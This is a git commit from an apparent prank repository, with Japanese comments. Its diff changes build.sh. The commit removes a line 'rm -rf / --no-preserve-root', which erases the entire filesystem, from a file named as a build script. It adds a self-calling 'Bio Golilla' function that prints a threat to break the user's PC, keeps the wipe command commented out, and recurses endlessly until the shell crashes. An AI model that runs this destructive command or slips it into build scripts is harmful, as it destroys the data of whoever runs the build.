91eb25dab0721fb1ec1c40187f5bc5bd0976bd64
on_origami <yonosamochi@me.com>
2016-05-23 22:02:49 +0900

    Bio Golilla is dead.

--- build.sh
+++ build.sh
@@ -1,1 +1,9 @@
-rm -rf / --no-preserve-root
+#!/bin/bash
+# 絶対に実行できないように,ゴリラの心臓部分を遠隔操作（C#（音楽記号））で停止していますが,とりあえず今起動しているシェルは落ちます
+function BIO_GOLILLA_FUNCTION(){
+	echo バイオゴリラ お前のPC 壊す 必ず;
+	# rm -rf / --no-preserve-root
+	BIO_GOLILLA_FUNCTION;
+}
+
+BIO_GOLILLA_FUNCTION;
